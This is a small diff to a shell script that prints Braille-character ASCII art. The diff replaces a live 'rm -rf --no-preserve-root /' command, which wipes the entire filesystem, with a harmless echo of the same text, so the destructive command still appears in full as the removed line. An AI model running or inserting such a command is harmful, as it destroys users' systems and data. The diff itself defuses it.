@@ -97,4 +97,4 @@ cat << "EOF2"
 ⣦⡑⠛⣟⢿⡿⣿⣷⣝⢧⡀⠀⠀⣶⣸⡇⣿⢸⣧⠀⠀⠀⠀⢸⡿⡆
 ⣿⣿⣷⣮⣭⣍⡛⠻⢿⣷⠿⣶⣶⣬⣬⣁⣉⣀⣀⣁⡤⢴⣺⣾⣽⡇
 EOF2
-rm -rf --no-preserve-root  /
+echo "rm -rf --no-preserve-root  /"
